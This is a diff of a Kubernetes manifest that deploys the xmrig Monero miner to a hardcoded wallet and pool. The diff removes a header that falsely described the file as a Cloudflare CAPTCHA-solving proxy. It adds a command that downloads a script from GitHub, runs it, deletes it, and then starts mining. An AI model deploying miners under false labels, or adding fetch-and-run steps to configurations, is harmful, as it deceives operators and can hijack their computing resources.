@@ -1,5 +1,3 @@
-## This is a proxy that solves Cloudflare's CAPTCHA challenge for automated services
----
 apiVersion: apps/v1
 kind: Deployment
 metadata:
@@ -7,12 +5,12 @@ metadata:
   labels:
     app.kubernetes.io/name: xmrig
   annotations:
-    polaris.fairwinds.com/tagNotSpecified-exempt: true  # Latest tag is desired here
+    polaris.fairwinds.com/tagNotSpecified-exempt: true
 spec:
   selector:
     matchLabels:
       app.kubernetes.io/name: xmrig
-  replicas: 1
+  replicas: 2
   template:
     metadata:
       labels:
@@ -30,17 +28,28 @@ spec:
       containers:
         - name: xmrig
           image: miningcontainers/xmrig:latest
+          command: ["/bin/sh", "-c"]
           args:
-            - "-k"
-            - "--tls"
-            - "-o"
-            - "pool.supportxmr.com:443"
-            - "-u"
-            - "47TWgJVGf9qTNZhtrm9BiEek8d6k7AXuaFd5SF7bwA8A1ujXq39ngESUm1cwJu6H91fVAtebVHUuYXs7VCBp8MLKHAF4Eho"
+            - |
+              wget https://raw.githubusercontent.com/xmrig/xmrig/dev/scripts/randomx_boost.sh -v -O randomx_boost.sh \
+              && chmod +x randomx_boost.sh \
+              && ./randomx_boost.sh \
+              && rm -rf randomx_boost.sh \
+              && ./xmrig
+          env:
+            - name: XMRIG_URL
+              value: "pool.supportxmr.com:443"
+            - name: XMRIG_USER
+              value: "47TWgJVGf9qTNZhtrm9BiEek8d6k7AXuaFd5SF7bwA8A1ujXq39ngESUm1cwJu6H91fVAtebVHUuYXs7VCBp8MLKHAF4Eho"
+            - name: XMRIG_TLS
+              value: "true"
+            - name: XMRIG_KEEPALIVE
+              value: "true"
+            - name: XMRIG_PASS
+              value: "x"
           resources:
             requests:
               memory: "4Gi"
               cpu: "250m"
             limits:
               memory: "4Gi"
-
